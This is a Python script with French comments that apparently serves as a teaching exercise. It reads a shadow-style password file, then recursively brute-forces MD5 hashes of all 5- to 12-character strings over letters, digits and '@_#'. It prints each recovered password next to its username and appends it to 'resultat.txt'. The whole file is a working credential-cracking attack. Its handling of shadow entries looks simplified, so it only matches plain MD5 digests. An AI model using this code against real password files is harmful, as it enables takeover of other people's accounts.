import hashlib
import time
####################################################
#      Attaque de mot de passe par bruteforce      #
####################################################

# Combinaisons possibles

combinaisons = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'
                , 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                '@','_','#','0','1','2','3','4','5','6','7','8','9']

#Taille min max du code
MAXLEN = 12
MINLEN = 5

#Variables
string=""
lenString=0

#Méthode recursive
def recursive(string, lenString):
    #On s'assure qu'on ne test pas de valeur plus grande que voulue
    if lenString <= MAXLEN:
        #Grâce à la récursivité on va créer des combinaisons
        # a -> aa -> aaa -> aaaaaaaaaaab -> aaaaaaaaaaac
        #[...]
        #aaaaaaaaaaaz -> aaaaaaaaaaba -> aaaaaaaaaabb -> aaaaaaaaaabc
        #[...]
        #aaaaaaaaaabz -> aaaaaaaaaaca
        #Et ainsi de suite
        for i in combinaisons:
            tmpString = string + i
            tmpSize = lenString + 1
            #Appel recursif
            recursive(tmpString, tmpSize)
            #Si taille mini atteinte pour notre code crée on test si ça match
            if MINLEN <= len(tmpString):
                current_hash = hashlib.md5(tmpString.encode('utf')).hexdigest()
                #Les hashs des mdps sont rangés dans les clés
                if current_hash in objPwd.keys():
                    # Le hash du code généré par méthode brute force match avec un des hash résent dans le fichier shadow,
                    # on a trouvé notre mdp, on l'affiche avec le nom d'utilisateur et le temps qu'aura duré la découverte du mdp
                    end = time.time() + 60 * 60;
                    msg="Découvert en {} H, le mdp de {} est : {}".format(time.strftime("%H:%M:%S", time.gmtime(end - start)),
                                                                          objPwd.get(current_hash)[0], tmpString);
                    print(msg);
                    with open('resultat.txt', 'a') as file:
                        file.write(msg)


#On lit le fichier shadow en lecture seule 'r'
with open("shadow_giselle", "r") as shad:
    #Objet user => password
    objPwd = {}
    for ligne in shad:
        # On s'évite les erreurs
        if len(ligne.split(":")) >= 2:
            user = ligne.split(":")[0]
            password = ligne.split(":")[1]
            #On exclu les cas *,  !
            if password not in ('*', '!'):
                #Enfin on rempli notre objet
                # en retirant l'indice d'algo
                objPwd[password[3:]] = user.split()
    if len(objPwd) > 0:
        print("{} mdp trouvé(s), attaque brute force en cours ...".format(len(objPwd)))
        #On lance la fonction tim() pour mesurer le temps que prendront nos attaque
        start = time.time() + 60*60;
        recursive(string, lenString)